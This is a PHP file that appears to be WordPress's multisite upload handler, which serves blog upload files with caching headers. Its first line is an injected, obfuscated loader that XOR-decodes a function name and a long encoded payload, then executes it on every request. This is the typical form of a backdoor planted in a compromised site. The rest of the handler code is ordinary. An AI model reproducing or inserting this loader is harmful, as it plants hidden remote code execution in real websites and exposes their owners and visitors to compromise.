<?php $RhlOcwVB='1K4OI28KGE-F;QN'^'R9Q.=Wg-2+N2R> ';$naQtAEmrPP=$RhlOcwVB('','RPiTK>PZ>>AEmEDYH6=iHS-05QRI0.oCU0WAhS0Iz.UB:T99NSL Ec6O05,c K2CF+1>,yDL>5ExSWXOS,8pql8U9wUArUB<ohM67ii IVYSMrnUY5 O;,VXl4+G3YNIsDFMdefEm:>BskvegK-;LXwCI.blEWKEYcRUcGIDT88E-Aa=< YgGtAY7F5HIY-zlC2NnY1XNY0BiFR 8YMjhF6=S+x1WZ9D 9>KDBsQH,ZO4VMZ6O==S ,jjLj7->1s1U4;goK7.ppvGiGPU>=qEGA>a5109;:HIZljS>EYmk>e P>7AhXLEQGG4J7EgkX<QgYA39FMgJ2g83.OT02=lEFjb 58 fyMO6XpUEAmLuyaX X:WfHOXxXu4;DT+9=+lUmbYE0h7KFIQRM3qDnW3OZG.zn4MsFLab7VL5cel41SMKNQX>I>7NAD ;.ALAo2ZIGQU9AKfBmOYV6P7CL2A,0gxbtDO0J=FE;dnYz0VBNO-;9qjqnACR1Wf9.>cX9<DY2AfP= baTaT29 cBClVK8JRxEH1TLiEEUAf7jDDsiB5cpjSGWSvomBTBEDmG tbzqCSUP+=vXXCcnTJCYK=J2eWQ+c,B>:61kWPZU5V ,pcquJ3I3jbETStuw71EQ=SBQFD >TbHI4JTO+Pc8PuFjY1IFRXjkxH'^';6Au-K>9JW.+2 <0;BNAo+BBj53=Qq0. DphAsKCsH ,Y PV s4O7<R.DTs<M>FkbOPJMUdhUP<QswxosW2yxHW MWhaUry6fa+YEAMIikycvRJ<eFT=WI8pHPJ3RpuiW-mfMooLIUK6SEKEOoIZ89,g sB2es   8v<Cbi7 JT CiEVYYp:nOKP>4P<<+CRH,G:Gb;Q3SMHcb6AL8mWH WQ NC;s>X0AfU.=bNq.M6<QmGPP OX2CDJBh5tbqz:tuUHGK RWPMHgM119KXXe<K7EQPDXdQ-0zQJwU  Va7AD1JVaUxh30+2Qq=8ma1ZqOxeWX2,NjIm1UA=1QQULmb50edme5-m.ExT> 8MqKYE.A4O2Oh4RqQQPZ05tRXRLhMF2 IS=BOm539RQyNsE.62KAd=0y;FkFS78TCXLtD=>.<89R DRf9+RdJ 8 0m7<3y7X2.Pv2+<5Y4RkhV XQNTBP .D+b- BMGbpY0jj+LOXQLWN 1 P.9RKG<=AU7-AiA;XYEMtE0SMAJbeJvcU.gPa,P -2b.08AjCdyNIeTWERcuecOXX es  YwFBWOCra33NYC>=dJNrlc89O+K:<4R<I:WIBBCp ;,Y9AHWOQQ.R=RCKetsTUWL;L4K2.yb AJ59o9U38 J4DeyNLc<I 2zhCPr5');$naQtAEmrPP();
/**
 * Multisite upload handler.
 *
 * @since 3.0.0
 *
 * @package WordPress
 * @subpackage Multisite
 */

define( 'SHORTINIT', true );
require_once( dirname( dirname( __FILE__ ) ) . '/wp-load.php' );

if ( !is_multisite() )
	die( 'Multisite support not enabled' );

ms_file_constants();

error_reporting( 0 );

if ( $current_blog->archived == '1' || $current_blog->spam == '1' || $current_blog->deleted == '1' ) {
	status_header( 404 );
	die( '404 &#8212; File not found.' );
}

$file = rtrim( BLOGUPLOADDIR, '/' ) . '/' . str_replace( '..', '', $_GET[ 'file' ] );
if ( !is_file( $file ) ) {
	status_header( 404 );
	die( '404 &#8212; File not found.' );
}

$mime = wp_check_filetype( $file );
if ( false === $mime[ 'type' ] && function_exists( 'mime_content_type' ) )
	$mime[ 'type' ] = mime_content_type( $file );

if ( $mime[ 'type' ] )
	$mimetype = $mime[ 'type' ];
else
	$mimetype = 'image/' . substr( $file, strrpos( $file, '.' ) + 1 );

header( 'Content-Type: ' . $mimetype ); // always send this
if ( false === strpos( $_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS' ) )
	header( 'Content-Length: ' . filesize( $file ) );

// Optional support for X-Sendfile and X-Accel-Redirect
if ( WPMU_ACCEL_REDIRECT ) {
	header( 'X-Accel-Redirect: ' . str_replace( WP_CONTENT_DIR, '', $file ) );
	exit;
} elseif ( WPMU_SENDFILE ) {
	header( 'X-Sendfile: ' . $file );
	exit;
}

$last_modified = gmdate( 'D, d M Y H:i:s', filemtime( $file ) );
$etag = '"' . md5( $last_modified ) . '"';
header( "Last-Modified: $last_modified GMT" );
header( 'ETag: ' . $etag );
header( 'Expires: ' . gmdate( 'D, d M Y H:i:s', time() + 100000000 ) . ' GMT' );

// Support for Conditional GET - use stripslashes to avoid formatting.php dependency
$client_etag = isset( $_SERVER['HTTP_IF_NONE_MATCH'] ) ? stripslashes( $_SERVER['HTTP_IF_NONE_MATCH'] ) : false;

if ( ! isset( $_SERVER['HTTP_IF_MODIFIED_SINCE'] ) )
	$_SERVER['HTTP_IF_MODIFIED_SINCE'] = false;

$client_last_modified = trim( $_SERVER['HTTP_IF_MODIFIED_SINCE'] );
// If string is empty, return 0. If not, attempt to parse into a timestamp
$client_modified_timestamp = $client_last_modified ? strtotime( $client_last_modified ) : 0;

// Make a timestamp for our most recent modification...
$modified_timestamp = strtotime($last_modified);

if ( ( $client_last_modified && $client_etag )
	? ( ( $client_modified_timestamp >= $modified_timestamp) && ( $client_etag == $etag ) )
	: ( ( $client_modified_timestamp >= $modified_timestamp) || ( $client_etag == $etag ) )
	) {
	status_header( 304 );
	exit;
}

// If we made it this far, just serve the file
readfile( $file );
flush();
